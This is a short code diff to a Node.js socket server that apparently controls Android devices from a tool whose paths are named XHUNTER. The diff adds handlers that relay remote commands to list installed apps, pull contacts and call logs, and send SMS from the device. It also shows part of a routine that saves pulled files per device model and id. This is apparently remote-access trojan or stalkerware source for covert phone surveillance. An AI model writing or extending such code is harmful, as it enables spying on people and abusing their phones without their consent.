@@ -36,6 +36,19 @@ io.on('connection', (socket) => {
     socket.on('getDir',(data)=>{
       rn_bridge.channel.post('getDir',JSON.stringify(data));
     });
+    socket.on('getInstalledApps',(data)=>{
+      rn_bridge.channel.post('getInstalledApps',JSON.stringify(data));
+    });
+    socket.on('getContacts',(data)=>{
+      rn_bridge.channel.post('getContacts',JSON.stringify(data));
+    });
+    socket.on('sendSMS',(data)=>{
+      rn_bridge.channel.post('sendSMS',JSON.stringify(data));
+    });
+    socket.on('getCallLog',(data)=>{
+      rn_bridge.channel.post('getCallLog',JSON.stringify(data));
+    });
+   
     socket.on("download", (d, callback) => {
       if(fs.existsSync(`/storage/emulated/0/XHUNTER`)){
         if(fs.existsSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
